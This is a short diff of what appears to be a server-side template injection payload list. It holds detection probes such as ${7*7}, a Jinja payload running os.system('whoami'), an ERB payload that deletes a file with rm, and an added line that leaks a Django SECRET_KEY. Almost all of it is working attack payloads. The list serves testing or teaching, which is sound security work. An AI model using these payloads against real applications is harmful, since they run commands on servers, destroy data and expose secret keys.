@@ -120,7 +120,10 @@ ${7*7}
 {{7*'7'}}
 ${{<%[%'"}}%\
 {% import os %}{{os.system('whoami')}}
+```
+```
 {% debug %}
+{{settings.SECRET_KEY}}
 ```
 ```
 <%= system("rm /home/carlos/morale.txt") %>
